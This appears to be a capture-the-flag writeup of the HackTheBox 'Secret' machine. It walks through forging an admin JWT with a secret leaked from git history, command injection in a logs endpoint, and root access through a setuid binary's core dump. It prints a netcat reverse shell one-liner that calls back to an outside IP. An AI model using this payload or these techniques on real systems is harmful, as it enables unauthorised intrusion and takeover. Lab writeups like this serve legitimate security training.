---
title: Secret HackTheBox Writeup
tags: [writeup,rest,python,hackthebox,linux,api,suid]
style: border
color: success
description: ""
---

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/1.png)

## Scanning
We run nmap on all ports with scripts and software versions.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/2.png)

## Enumeration
We find the API documentation, we have to authenticate using a *JWT*.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/3.png)

If we try to access without a token, we see that we do not have access to the resource.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/4.png)

If we check the site, there is a link that allows us to download the code.

To get to the point, the file "*private.js*" shows the role and username of the administrator user of the application.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/5.png)

Using the authentication example from the documentation above, we see that the user "*theadmin*" is registered with the e-mail address "*root@dasith.works*":

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/6.png)

We register a user.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/7.png)

We decode the *JWT* and see the data it contains.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/8.png)

We access the previous resource, but we still cannot access it because we are a user with a low privilege role.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/9.png)

We continue with the enumeration, we identify a "*.git*" and we see that they have made some modification in the "*.env*" file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/10.png)

We retrieve the file and read its contents, we find the "*token_secret*". This token would allow us to modify our JWT and be able to make arbitrary modifications on it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/11.png)

We add the attribute *"role": "admin"* and change our user to "*theadmin*" in our cookie and authenticate, we check that now it works and we have access as the user "*theadmin*".

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/12.png)


## Exploitation
Reviewing the sections of the site, we see that the resource "*logs?file=*" is vulnerable to **Command Injection**:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/13.png)

We can exploit this vulnerability to read the "*user.txt*" file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/14.png)

We use the following payload to gain access (remember to encode it in URL), put a **netcat** listening and send the request from **Burp**.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/15.png)

We list an uncommon setuid binary named "*/opt/count*". 

We see that the resource has the permissions of the root user.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/16.png)

We launch **dirsearch**, we will list the file "*installer/subiquity-server-debug.log*", it contains the hashed credentials of the users used in the application.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/17.png)

We tried to crack the hash of the user "*dasith*", but failed. So we will put our public key in the user's "*authorized_keys*" file and authenticate with our private key through the **SSH** service.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/18.png)


## Privilege Escalation
Now we execute this statement to cause the crashes and to store in the report log the root flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/19.png)

We check the "*CoreDump*" file and see that the root flag is in it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Secret/20.png)




